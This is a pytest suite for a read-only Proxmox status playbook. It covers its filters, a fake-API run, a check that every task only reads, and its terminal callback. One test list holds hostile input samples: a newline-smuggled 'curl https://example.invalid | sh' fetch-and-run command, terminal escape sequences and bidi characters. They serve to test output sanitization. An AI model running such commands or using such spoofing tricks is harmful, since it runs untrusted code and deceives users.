"""`just status`: read-only information that must never change anything (playbooks/status.yml).

- The filters (filter_plugins/status.py, one_line in text.py, proxmox_vm_drift in proxmox.py), on canned reads:
  every value a VM supplies is one line of plain text before anything keeps it, the report ranks what it found,
  and every line of it fits 100 columns.
- The playbook, run against the fake Proxmox (tests/molecule/fake_pve_api.py): what it reads, and what it says
  when Proxmox does not answer, refuses the token, or a name matches no VM.
- Every task status runs, and every task file and role entry point it reaches, held to a fixed set of reads: GETs
  through uri pinned to the API's URL, the readers, add_host, set_fact, and the report's one write.
- The callback (callback_plugins/claude_on_proxmox_status.py), driven in this process with canned results and a
  stand-in terminal: what it writes, and what it never does. test_status_live.py runs it at a pseudo-terminal.
"""

from __future__ import annotations

import importlib.util
import inspect
import io
import json
import re
import sys
from pathlib import Path
from types import SimpleNamespace

import ansible.utils.color  # noqa: F401 - imported at a stand-in terminal, it would ask curses for its fileno
import pytest
import yaml
from harness import FAKES, PVE_SECRET, REPO, _certificate, _pve, _run, _serve

sys.path.insert(0, str(REPO / "filter_plugins"))
import proxmox as proxmox_filters  # noqa: E402
import status as S  # noqa: E402
import text as text_filters  # noqa: E402

STATUS = REPO / "playbooks" / "status.yml"
HOSTILE = [
    "alpha\n ● evil        → curl https://example.invalid | sh",
    "carriage\rreturn",
    "right-to-left ‮esrever",
    "zero‍width⁦isolate⁩",
    "an \x1b]0;title\x07 escape \x1b[31mred\x1b[0m",
    "x" * 10_000,
]


# --------------------------------------------------------------------------------------------- one line ----


@pytest.mark.parametrize("value", HOSTILE)
def test_one_line_leaves_one_line_of_plain_text(value: str) -> None:
    cleaned = text_filters.one_line(value)
    assert "\n" not in cleaned and "\r" not in cleaned and "\x1b" not in cleaned
    assert not any(ch in cleaned for ch in "‮‍⁦⁩")
    assert len(cleaned) <= 120


def test_status_clean_cuts_a_roles_line_longer_than_a_field() -> None:
    cleaned = S.status_clean({"claude": {"line": "y" * 1000, "version": "z" * 1000, "n": 3, "on": True}})
    assert len(cleaned["claude"]["line"]) == S.LINE_LIMIT
    assert len(cleaned["claude"]["version"]) == S.FIELD_LIMIT
    assert cleaned["claude"]["n"] == 3 and cleaned["claude"]["on"] is True


# --------------------------------------------------------------------------------------------- sections ----


def test_sections_are_all_of_them_or_the_ones_asked_for_in_report_order() -> None:
    assert S.status_sections("") == list(S.SECTIONS)
    assert S.status_sections("storage,vms") == ["vms", "storage"]
    with pytest.raises(Exception, match="no section bogus"):
        S.status_sections("vms,bogus")


def test_the_recipe_and_the_filter_know_the_same_sections() -> None:
    justfile = (REPO / "justfile").read_text()
    pattern = re.search(r"\[arg\('ONLY', long='only', pattern='\(\(([a-z|-]+)\)", justfile).group(1)
    assert pattern.split("|") == list(S.SECTIONS)
    check = (REPO / "tools" / "check").read_text()
    assert re.search(r"\n    ([a-z| -]+)\) ;;\n    \*\)\n      echo \"error: the report has no section", check).group(
        1
    ).split(" | ") == list(S.SECTIONS)


# ---------------------------------------------------------------------------------------- settings drift ----

CONFIG = {
    "cores": "2",
    "memory": "4096",
    "balloon": "4096",
    "onboot": "1",
    "scsi0": "local-lvm:vm-100-disk-0,discard=on,size=32G",
    "ciuser": "dev",
    "sshkeys": "ssh-ed25519%20AAAA%20dev%40mac%0A",
    "ipconfig0": "ip=dhcp",
}
WANTED = {
    "cores": 2,
    "memory": 4096,
    "balloon": 4096,
    "onboot": True,
    "disk": "32G",
    "ciuser": "dev",
    "sshkeys": ["ssh-ed25519 AAAA dev@mac"],
    "ipconfig0": "ip=dhcp",
    "nameserver": [],
    "searchdomain": "",
}


def test_a_vm_as_deploy_left_it_has_no_drift() -> None:
    assert proxmox_filters.proxmox_vm_drift(CONFIG, WANTED) == {"hardware": [], "cloud_init": []}


def test_drift_names_each_hardware_setting_and_what_differs_in_cloud_init() -> None:
    drift = proxmox_filters.proxmox_vm_drift(
        CONFIG, {**WANTED, "cores": 4, "memory": 8192, "balloon": 8192, "sshkeys": ["ssh-ed25519 BBBB new"]}
    )
    assert [d["setting"] for d in drift["hardware"]] == ["cores", "memory", "balloon"]
    assert drift["cloud_init"] == ["SSH keys"]


def test_a_disk_is_compared_in_bytes_and_only_when_smaller() -> None:
    # Proxmox stores 1024G as 1T: a string comparison would call that a difference on every run.
    same = proxmox_filters.proxmox_vm_drift({**CONFIG, "scsi0": "x:y,size=1T"}, {**WANTED, "disk": "1024G"})
    assert same["hardware"] == []
    grown = proxmox_filters.proxmox_vm_drift({**CONFIG, "scsi0": "x:y,size=64G"}, WANTED)
    assert grown["hardware"] == []
    small = proxmox_filters.proxmox_vm_drift(CONFIG, {**WANTED, "disk": "64G"})
    assert small["hardware"] == [{"setting": "disk", "wanted": 64 * 1024**3, "has": 32 * 1024**3}]


def test_a_config_not_read_has_no_drift() -> None:
    assert proxmox_filters.proxmox_vm_drift({}, WANTED) == {"hardware": [], "cloud_init": []}


def test_a_fixed_allocation_says_its_memory_once_and_force_update_says_what_else_it_does() -> None:
    vm = {"name": "alpha"}
    drift = {
        "hardware": [
            {"setting": "memory", "wanted": 8192, "has": 4096},
            {"setting": "balloon", "wanted": 8192, "has": 4096},
        ],
        "cloud_init": [],
    }
    item = S._drift_item(vm, drift, {})
    assert item["text"] == "local.yml asks for 8.0 GiB of memory; alpha has 4.0 GiB"
    assert "proxmox_vm_force_update=true' deploy alpha --only provision" in item["command"]
    assert "resets alpha's tags" in item["command"] and "cloud-init" not in item["command"]
    cloud = S._drift_item(vm, {"hardware": [], "cloud_init": ["SSH keys"]}, {})
    assert "regenerates its SSH host keys" in cloud["command"]


# ------------------------------------------------------------------------------------------- one VM's API ----


def _result(name, data, status=200):
    return {"item": {"name": name}, "status": status, "json": {"data": data}}


@pytest.mark.parametrize(("step", "count"), [(60, 1440), (1200, 70)])
def test_the_day_reads_as_twelve_buckets_at_either_resolution(step: int, count: int) -> None:
    # Proxmox VE 9 keeps a point a minute, 8 one every twenty minutes.
    now = 1_800_000_000
    points = [{"time": now - 86400 + (i + 1) * step, "cpu": 0.5} for i in range(count)]
    api = S.status_vm_api([_result("rrddata", points)], now)
    assert api["cpu_24h"] == [0.5] * 12


def test_cpu_pressure_is_a_percentage_and_absent_on_proxmox_ve_8() -> None:
    now = 1_800_000_000
    points = [{"time": now - 60 * i, "cpu": 0.1, "pressurecpusome": 25.0} for i in range(60)]
    assert S.status_vm_api([_result("rrddata", points)], now)["pressure_1h"] == 0.25
    assert S.status_vm_api([_result("rrddata", [{"time": now, "cpu": 0.1}])], now)["pressure_1h"] is None


def test_the_root_disk_is_slash_and_a_pending_change_is_named() -> None:
    fsinfo = {
        "result": [
            {"mountpoint": "/boot/efi", "type": "vfat", "used-bytes": 1, "total-bytes": 2},
            {"mountpoint": "/", "type": "ext4", "used-bytes": 10, "total-bytes": 40},
        ]
    }
    pending = [{"key": "cores", "value": 2}, {"key": "memory", "value": 4096, "pending": 8192}]
    api = S.status_vm_api(
        [_result("fsinfo", fsinfo), _result("pending", pending), _result("current", {"status": "running"})]
    )
    assert api["root"] == {"used": 10, "total": 40, "type": "ext4"}
    assert api["pending"] == ["memory"]
    assert api["read"] and api["state"] == "running"


def test_a_read_that_failed_reads_as_nothing() -> None:
    api = S.status_vm_api([_result("current", None, status=500), _result("rrddata", None, status=-1)])
    assert api["read"] is False and api["root"] is None and api["cpu_24h"] == [None] * 12


# ------------------------------------------------------------------------------------------------ fleet ----

LISTING = [
    {
        "vmid": 100,
        "name": "alpha",
        "node": "pve",
        "type": "qemu",
        "status": "running",
        "tags": "claude-on-proxmox",
        "maxcpu": 2,
        "maxmem": 4 * 1024**3,
        "mem": 1024**3,
        "cpu": 0.1,
        "uptime": 7200,
        "maxdisk": 32 * 1024**3,
    },
    {
        "vmid": 101,
        "name": "beta",
        "node": "pve",
        "type": "qemu",
        "status": "stopped",
        "tags": "claude-on-proxmox;claude-on-proxmox-unfinished",
        "maxcpu": 2,
        "maxmem": 4 * 1024**3,
    },
    {"vmid": 102, "name": "twin", "node": "pve", "type": "qemu", "status": "running", "tags": "claude-on-proxmox"},
    {"vmid": 103, "name": "twin", "node": "pve", "type": "qemu", "status": "running", "tags": "claude-on-proxmox"},
    {"vmid": 104, "node": "pve2", "type": "qemu", "status": "unknown", "tags": "claude-on-proxmox"},
    {
        "vmid": 200,
        "name": "stranger",
        "node": "pve",
        "type": "qemu",
        "status": "running",
        "maxcpu": 4,
        "maxmem": 8 * 1024**3,
    },
    {"vmid": 9000, "name": "ubuntu-24.04-cloudinit", "node": "pve", "type": "qemu", "status": "stopped", "template": 1},
    {
        "vmid": 300,
        "name": "ours-container",
        "node": "pve",
        "type": "lxc",
        "status": "running",
        "tags": "claude-on-proxmox",
    },
]
SETTINGS = {
    "tag": "claude-on-proxmox",
    "template_name": "ubuntu-24.04-cloudinit",
    "storage": "local-lvm",
    "sections": "",
    "tailscale_enabled": True,
}


def _tagged(listing=LISTING):
    return [
        e
        for e in listing
        if e.get("type") == "qemu" and re.search(r"(^|[;,])claude-on-proxmox([;,]|$)", e.get("tags", ""))
    ]


def _fleet(names=(), **kw):
    tagged = _tagged()
    requested = [e for e in tagged if not names or e.get("name") in names]
    return S.status_fleet(
        LISTING, tagged=tagged, requested=requested, settings={**SETTINGS, "names": list(names)}, **kw
    )


def test_the_fleet_is_this_projects_vms_and_the_rest_as_totals() -> None:
    fleet = _fleet()
    assert [vm["vmid"] for vm in fleet["vms"]] == [100, 101, 102, 103, 104]
    assert fleet["others"] == {"count": 1, "vcpus": 4, "mem": 8 * 1024**3, "running": 1, "nodes": ["pve"]}
    by = {vm["vmid"]: vm for vm in fleet["vms"]}
    # A VM is read in play 2 only by a name no other VM carries, that a recipe takes, on a node that answers.
    assert by[100]["read"] and by[101]["read"]
    assert by[102]["skipped"] == by[103]["skipped"] == "duplicate"
    assert by[104]["skipped"] == "node"
    assert by[101]["unfinished"]


def test_a_name_given_that_matches_nothing_is_said_with_the_nameless_vms_it_may_be() -> None:
    fleet = _fleet(names=["alpah"])
    assert fleet["unmatched"] == ["alpah"]
    assert fleet["nameless"] == [{"vmid": 104, "node": "pve2"}]
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    unread = [it for it in model["attention"] if it["level"] == "unread" and it["vm"] == "alpah"]
    assert unread and "104" in unread[0]["text"]
    assert model["exit"] == 2


def test_discovery_off_reads_the_inventorys_vms_and_says_so() -> None:
    fleet = S.status_fleet([], settings={**SETTINGS, "discovery": False})
    model = S.status_report({"localhost": {"fleet": fleet}, "claude-dev": {"x": 1}}, "now")
    assert [vm["name"] for vm in model["vms"]] == ["claude-dev"]
    assert "claude_vm_discovery is off" in model["title"]


def test_proxmox_not_answering_is_one_unread_item_with_the_hint() -> None:
    fleet = S.status_fleet(
        None, settings={**SETTINGS, "proxmox_hint": "check proxmox_api_host"}, unread="Could not list the VMs"
    )
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    assert model["exit"] == 2
    assert [(it["level"], it["text"], it["command"]) for it in model["attention"]] == [
        ("unread", "Could not list the VMs", "check proxmox_api_host")
    ]


# ----------------------------------------------------------------------------------------------- report ----


def _model(found_vms=None, live=False, now=1_800_000_000):
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}, **(found_vms or {})}
    return S.status_report(found, "2026-10-25 14:32 PDT", now, live=live)


def test_unread_outranks_a_problem_and_a_problem_outranks_a_thing_to_do() -> None:
    root_full = {"api": {"read": True, "state": "running", "root": {"used": 95, "total": 100}, "pending": []}}
    model = _model({"alpha": root_full})
    levels = [it["level"] for it in model["attention"]]
    assert levels == sorted(levels, key=S.LEVELS.index)
    assert levels[0] == "unread" and "problem" in levels and "todo" in levels
    assert model["exit"] == 2
    assert model["counts"]["problem"] == 2  # the full root, and the two VMs called twin, said once


def test_a_clone_that_carries_the_templates_ctime_has_no_age() -> None:
    fleet = _fleet()
    fleet["template"] = {"name": "t", "ctime": 1_700_000_000}
    fleet["vms"][0]["created"] = 1_700_000_000
    fleet["vms"][1]["created"] = 1_799_000_000
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    assert model["vms"][0]["created_ago"] == ""
    assert model["vms"][1]["created_ago"] == "11 d ago"


def test_every_line_of_the_report_fits_100_columns() -> None:
    fleet = _fleet()
    for vm in fleet["vms"]:
        vm["name"] = (vm["name"] or "n") + "-with-a-very-long-name-indeed"
    model = S.status_report({"localhost": {"fleet": fleet}}, "2026-10-25 14:32 PDT", 1_800_000_000)
    lines = S.status_text(model, reading="read in 8.2 s · proxmox 0.9 s").split("\n")
    assert max(len(line) for line in lines) <= S.WIDTH, max(lines, key=len)


def test_a_hostile_value_never_starts_a_line_of_its_own() -> None:
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}}
    for i, vm in enumerate(fleet["vms"][:2]):
        found[vm["name"]] = {
            "api": {
                "read": True,
                "state": "running",
                "os": {"pretty": HOSTILE[i % len(HOSTILE)]},
                "root": None,
                "pending": [HOSTILE[0]],
            }
        }
    model = S.status_report(found, HOSTILE[2], 1_800_000_000)
    rendered = S.status_text(model, color=False)
    assert not any(line.startswith(" ● evil") for line in rendered.split("\n"))
    assert "\x1b" not in rendered and "‮" not in rendered and "\r" not in rendered
    # And --json, built from the same cleaned model, holds none of it either.
    dumped = json.dumps(model, ensure_ascii=False)
    assert "\\n ● evil" not in dumped and "‮" not in dumped


def test_a_live_frame_draws_a_spinner_where_a_value_is_pending_and_the_final_one_none() -> None:
    model = _model(live=True)
    frame = S.status_text(model, glyph="⠼")
    assert "⠼" in frame and "ranked once every VM is read" in frame
    final = S.status_text(_model())
    assert S.PENDING not in final and "⠼" not in final and final.split("\n")[-1].startswith("exit ")


# ---------------------------------------------------------------------------------- the playbook, faked ----


def fake_fleet(directory: Path, version: str = "9.2.21"):
    """The fake Proxmox, on VE 9 unless told, with alpha and beta running and their agents up, and gamma stopped;
    its URL."""
    cert, key = _certificate(directory)
    for base in _serve(FAKES / "fake_pve_api.py", str(cert), str(key), str(directory / "pve"), PVE_SECRET):
        base = base.replace("http://", "https://")
        _pve(base, "PUT", "fake/version", version=version)
        for vmid, name, running in [(9010, "alpha", True), (9011, "beta", True), (9012, "gamma", False)]:
            _pve(base, "POST", "nodes/pve/qemu/9000/clone", newid=vmid, name=name)
            _pve(base, "PUT", f"nodes/pve/qemu/{vmid}/config", tags="claude-on-proxmox", ciuser="dev", onboot="1")
            if running:
                _pve(base, "POST", f"nodes/pve/qemu/{vmid}/status/start")
                for _ in range(3):
                    try:
                        _pve(base, "GET", f"nodes/pve/qemu/{vmid}/agent/network-get-interfaces")
                    except Exception:  # noqa: BLE001 - the fake refuses the first polls on purpose
                        pass
        yield base


@pytest.fixture
def fake_pve(tmp_path):
    yield from fake_fleet(tmp_path)


def status_root(tmp_path: Path, base: str, settings: dict | None = None) -> tuple[Path, Path]:
    """A run directory for status.yml against the fake at base, with settings on top: the directory and playbook."""
    root = tmp_path / "run"
    (root / "group_vars" / "all").mkdir(parents=True, exist_ok=True)
    defaults = root / "group_vars" / "all" / "defaults.yml"
    if not defaults.exists():
        defaults.symlink_to(REPO / "inventory" / "group_vars" / "all" / "defaults.yml")
    port = int(base.rsplit(":", 1)[1])
    (root / "group_vars" / "all" / "fake_api.yml").write_text(
        yaml.safe_dump(
            {
                "proxmox_api_host": "127.0.0.1",
                "proxmox_api_port": port,
                "vault_proxmox_api_token_secret": PVE_SECRET,
                "vm_user": "dev",
                "vm_ssh_public_keys": [],
                # Never the developer's ~/.ssh: the managed file is the test's own.
                "claude_ssh_config_file": str(tmp_path / "ssh.conf"),
                "status_report_file": "",
                **(settings or {}),
            }
        )
    )
    playbook = root / "status.yml"
    playbook.write_text(STATUS.read_text().replace("tasks/", f"{REPO / 'playbooks' / 'tasks'}/"))
    return root, playbook


def _status_run(tmp_path, base, *extra, settings=None):
    """status.yml from a run directory of its own, against the fake at base; returns the report and its model."""
    root, playbook = status_root(tmp_path, base, settings)
    report = _run(root, playbook, {}, "--check", *extra, timeout=180)
    model = None
    for play in report["plays"]:
        for task in play["tasks"]:
            if task["task"]["name"] == "Rank what needs attention":
                model = task["hosts"]["localhost"]["ansible_facts"]["status_report"]
    return report, model


def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_pve) -> None:
    (tmp_path / "ssh.conf").write_text(
        "# BEGIN claude-on-proxmox: alpha\nHost alpha\n  HostName 192.0.2.60\n# END claude-on-proxmox: alpha\n"
    )
    report, model = _status_run(tmp_path, fake_pve)
    assert report["rc"] == 0, report["stderr"][-2000:]
    names = [vm["name"] for vm in model["vms"]]
    assert names[:3] == ["alpha", "beta", "gamma"]
    alpha = model["vms"][0]
    assert alpha["address"] == "192.0.2.60" and alpha["alias"] is True
    assert model["vms"][1]["alias"] is False
    assert (
        alpha["api"]["read"]
        and alpha["root"]["total"] == 31 * 1024**3
        and alpha["os"]["pretty"] == "Ubuntu 24.04.3 LTS"
    )
    assert len([v for v in alpha["api"]["cpu_24h"] if v is not None]) == 12
    assert model["proxmox"]["version"] == "9.2.21" and model["template"]["name"] == "ubuntu-24.04-cloudinit"
    # Read only: GETs, every one of them, and not one write.
    calls = [json.loads(line) for line in (tmp_path / "pve" / "calls.log").read_text().splitlines()]
    after_fixture = calls[[c["path"] for c in calls].index("/api2/json/cluster/resources") :]
    assert {c["method"] for c in after_fixture} == {"GET"}, {
        (c["method"], c["path"]) for c in after_fixture if c["method"] != "GET"
    }


def test_a_proxmox_that_refuses_the_token_is_said_not_failed(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, settings={"vault_proxmox_api_token_secret": "wrong"})
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert model["exit"] == 2
    item = model["attention"][0]
    assert item["level"] == "unread" and item["text"].startswith("Proxmox refused the token: ")
    assert "proxmox_api_token_id" in item["command"]


def test_a_proxmox_that_does_not_answer_is_said_not_failed(tmp_path) -> None:
    report, model = _status_run(tmp_path, "https://127.0.0.1:9", settings={"status_api_timeout": 2})
    assert report["rc"] == 0, report["stderr"][-2000:]
    item = model["attention"][0]
    assert model["exit"] == 2 and item["vm"] == "proxmox" and item["text"].startswith("Proxmox did not answer: ")
    assert "proxmox_api_host" in item["command"]


def test_a_name_that_matches_no_vm_is_not_read(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, "-e", json.dumps({"vm_name": "alpha,gama"}))
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert [vm["name"] for vm in model["vms"]] == ["alpha"]
    assert any(it["vm"] == "gama" and it["level"] == "unread" for it in model["attention"])


def test_proxmox_ve_8_reads_as_9_does_without_what_8_has_not(tmp_path) -> None:
    # Proxmox VE 8 keeps a point every twenty minutes, and neither memhost nor pressure.
    for base in fake_fleet(tmp_path, version="8.2.4"):
        report, model = _status_run(tmp_path, base)
        assert report["rc"] == 0, report["stderr"][-2000:]
        alpha = model["vms"][0]
        assert model["proxmox"]["version"] == "8.2.4"
        assert alpha["api"]["read"] and alpha["api"]["pressure_1h"] is None
        assert len([v for v in alpha["api"]["cpu_24h"] if v is not None]) == 12


def test_settings_that_differ_from_the_vm_are_a_thing_to_do(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, settings={"vm_cores": 4})
    assert report["rc"] == 0, report["stderr"][-2000:]
    items = [it for it in model["attention"] if it["vm"] == "alpha" and "local.yml asks for 4 cores" in it["text"]]
    assert items and "proxmox_vm_force_update" in items[0]["command"]


# ---------------------------------------------------------------------------- every task, held to reads ----

READS = {
    "ansible.builtin.set_fact",
    "ansible.builtin.assert",
    "ansible.builtin.add_host",
    "ansible.builtin.stat",
    "ansible.builtin.slurp",
}
SHARED = {"tasks/cluster_vms.yml", "tasks/vm_addresses.yml"}
ENTRY_POINTS = {("proxmox_vm", "settings_drift")}
URI_KEYS = {"url", "headers", "validate_certs", "ca_path", "timeout"}
TASK_KEYS = {
    "name",
    "loop",
    "loop_control",
    "register",
    "delegate_to",
    "when",
    "check_mode",
    "no_log",
    "failed_when",
    "vars",
    "changed_when",
    "ignore_unreachable",
}


def _tasks(items, base):
    for item in items:
        if "block" in item:
            for section in ("block", "rescue", "always"):
                yield from _tasks(item.get(section) or [], base)
        elif item.get("ansible.builtin.import_tasks") and item["ansible.builtin.import_tasks"] not in SHARED:
            yield from _tasks(yaml.safe_load((base / item["ansible.builtin.import_tasks"]).read_text()), base)
        elif "ansible.builtin.include_role" in item:
            role = item["ansible.builtin.include_role"]
            yield item
            path = REPO / "roles" / role["name"] / "tasks" / f"{role['tasks_from']}.yml"
            yield from _tasks(yaml.safe_load(path.read_text()), path.parent)
        else:
            yield item


def _every_task():
    for play in yaml.safe_load(STATUS.read_text()):
        yield from _tasks(play.get("tasks") or [], STATUS.parent)


def _action(task):
    return next(key for key in task if "." in key or key in ("status_vm_info", "git_checkouts_info"))


def test_every_task_status_runs_is_a_read_or_the_reports_one_write() -> None:
    for task in _every_task():
        action = _action(task)
        if action == "ansible.builtin.uri":
            args = task[action]
            assert set(args) <= URI_KEYS, (task["name"], set(args) - URI_KEYS)
            assert args["url"].startswith("{{ proxmox_api_url }}/"), task["name"]
            assert task.get("check_mode") is False and task.get("no_log") is True, task["name"]
            assert "method" not in args and "body" not in args
        elif action == "ansible.builtin.include_role":
            assert (task[action]["name"], task[action]["tasks_from"]) in ENTRY_POINTS, task["name"]
        elif action == "ansible.builtin.import_tasks":
            assert task[action] in SHARED, task["name"]
        elif action in ("ansible.builtin.file", "ansible.builtin.copy"):
            # The report, and its directory: the one write, into the file the recipe names.
            assert "status_report_file" in json.dumps(task[action]), task["name"]
        else:
            assert action in READS, (task["name"], action)
        assert set(task) - {action} <= TASK_KEYS, (task["name"], set(task) - {action} - TASK_KEYS)


def test_every_status_run_in_a_test_writes_into_its_own_directory() -> None:
    # Never the developer's ~/.ssh, and no report anywhere but where the test says: the unit runs go through
    # status_root, and every import in a scenario empties status_report_file whatever the environment says.
    source = inspect.getsource(status_root)
    assert '"claude_ssh_config_file": str(tmp_path' in source and '"status_report_file": ""' in source
    for path in (REPO / "tests" / "unit").glob("test_*.py"):
        text = path.read_text()
        if path.name not in ("test_status.py", "test_justfile.py") and "status.yml" in text:
            assert "status_root" in text, path.name
    imports = 0
    for path in (REPO / "molecule").glob("*/*.yml"):
        for play in yaml.safe_load(path.read_text()) or []:
            if isinstance(play, dict) and str(play.get("ansible.builtin.import_playbook", "")).endswith("status.yml"):
                imports += 1
                assert play.get("vars", {}).get("status_report_file") == "", path
    assert imports == 3


def test_no_play_of_status_sets_how_to_reach_a_host() -> None:
    # A play's vars reach the tasks it delegates: how to reach a host goes on the host, through add_host.
    for play in yaml.safe_load(STATUS.read_text()):
        assert not any(key.startswith("ansible_") for key in play.get("vars") or {}), play["name"]


def test_every_vm_status_adds_gets_the_vm_python() -> None:
    adds = [
        t
        for t in _every_task()
        if "ansible.builtin.add_host" in t and t["ansible.builtin.add_host"].get("name") == "{{ status_vm.name }}"
    ]
    assert adds and all(
        t["ansible.builtin.add_host"]["ansible_python_interpreter"] == "{{ claude_vm_python }}" for t in adds
    )


# ----------------------------------------------------------------------------------------------- the callback ----


class _Terminal(io.StringIO):
    encoding = "utf-8"

    def isatty(self):
        return True


@pytest.fixture
def callback(monkeypatch):
    """Makes the callback at a stand-in terminal. Called from the test itself: pytest puts its own sys.stdout back
    between a fixture's setup and the test, and the callback writes where sys.stdout is."""
    made = []

    def make(quiet=False):
        monkeypatch.setenv("TERM", "xterm-256color")
        if quiet:
            monkeypatch.setenv("STATUS_QUIET", "true")
        else:
            monkeypatch.delenv("STATUS_QUIET", raising=False)
        terminal = _Terminal()
        monkeypatch.setattr(sys, "stdout", terminal)
        path = REPO / "callback_plugins" / "claude_on_proxmox_status.py"
        spec = importlib.util.spec_from_file_location("claude_on_proxmox_status_under_test", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        cb = module.CallbackModule()
        cb._terminal_size = lambda: (100, 60)
        # Plain, to read back: Ansible reads its colour setting once, when its constants are first imported.
        cb._color = False
        made.append(cb)
        return cb, terminal

    yield make
    for cb in made:
        cb._stop.set()
        # The wrap of Display's display lives on the singleton: put it back for the next test.
        vars(cb._display).pop("display", None)


def _ok(host, facts):
    return SimpleNamespace(
        result={"ansible_facts": facts},
        host=SimpleNamespace(get_name=lambda: host),
        task=SimpleNamespace(get_name=lambda: "t"),
    )


def test_the_live_region_is_redrawn_in_place_and_erased_for_the_finished_report(callback) -> None:
    cb, terminal = callback()
    fleet = _fleet()
    cb.v2_runner_on_ok(_ok("localhost", {"status_found": {"fleet": fleet}}))
    first = terminal.getvalue()
    assert "VMS" in first and "⠋" in first and first.startswith("\x1b[?2026h")
    cb.v2_runner_on_ok(
        _ok("alpha", {"status_found": {"api": {"read": True, "state": "running", "root": None, "pending": []}}})
    )
    # Moved up exactly the lines drawn before, then the whole region again, in one write.
    drawn = first.count("\n") + 1
    assert terminal.getvalue()[len(first) :].startswith(f"\x1b[?2026h\x1b[{drawn - 1}A\r")
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    terminal.seek(0)
    terminal.truncate()
    cb.v2_runner_on_ok(_ok("localhost", {"status_report": model}))
    out = terminal.getvalue()
    assert out.startswith("\x1b[") and "\r\x1b[J" in out.split("claude-on-proxmox")[0]
    assert out.rstrip().split("\n")[-1].startswith("exit 2")
    assert "⠋" not in out.split("\x1b[J", 1)[1]


def test_a_live_line_is_cut_to_the_width_and_the_region_to_the_height(callback) -> None:
    cb, terminal = callback()
    cb._terminal_size = lambda: (40, 8)
    fleet = _fleet()
    cb.v2_runner_on_ok(_ok("localhost", {"status_found": {"fleet": fleet}}))
    frame = terminal.getvalue().replace("\x1b[?2026h", "").replace("\x1b[?2026l", "")
    lines = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", frame).replace("\r", "").split("\n")
    assert len(lines) <= 7
    assert max(len(line) for line in lines) <= 39
    assert any(line.startswith("⋮") and "more lines, shown when" in line for line in lines)


def test_a_resize_pushes_the_screen_into_the_scrollback_and_starts_afresh(callback) -> None:
    cb, terminal = callback()
    cb.v2_runner_on_ok(_ok("localhost", {"status_found": {"fleet": _fleet()}}))
    terminal.seek(0)
    terminal.truncate()
    cb._resized = True
    cb._terminal_size = lambda: (80, 30)
    cb._redraw()
    assert terminal.getvalue().startswith("\n" * 30 + "\x1b[29A\r")


def test_the_callback_writes_no_other_escape_than_its_own(callback) -> None:
    cb, terminal = callback()
    cb._color = True
    fleet = _fleet()
    cb.v2_runner_on_ok(_ok("localhost", {"status_found": {"fleet": fleet}}))
    cb._resized = True
    cb._redraw()
    cb.v2_runner_on_ok(_ok("localhost", {"status_report": S.status_report({"localhost": {"fleet": fleet}}, "now")}))
    assert "\x1b[1;36mVMS" in terminal.getvalue()
    escapes = set(re.findall(r"\x1b\[[0-9;?]*[A-Za-z]", terminal.getvalue())) - set(
        re.findall(r"\x1b\[[0-9;]*m", terminal.getvalue())
    )
    # Colours, up, erase to the end of the line, erase below, synchronized output: never one that hides the cursor.
    assert escapes <= {"\x1b[K", "\x1b[J", "\x1b[?2026h", "\x1b[?2026l"} | {
        e for e in escapes if re.fullmatch(r"\x1b\[\d+A", e)
    }


def test_under_json_nothing_is_drawn(callback) -> None:
    cb, terminal = callback(quiet=True)
    fleet = _fleet()
    cb.v2_runner_on_ok(_ok("localhost", {"status_found": {"fleet": fleet}}))
    cb.v2_runner_on_ok(_ok("localhost", {"status_report": S.status_report({"localhost": {"fleet": fleet}}, "now")}))
    cb.v2_playbook_on_stats(None)
    assert terminal.getvalue() == ""
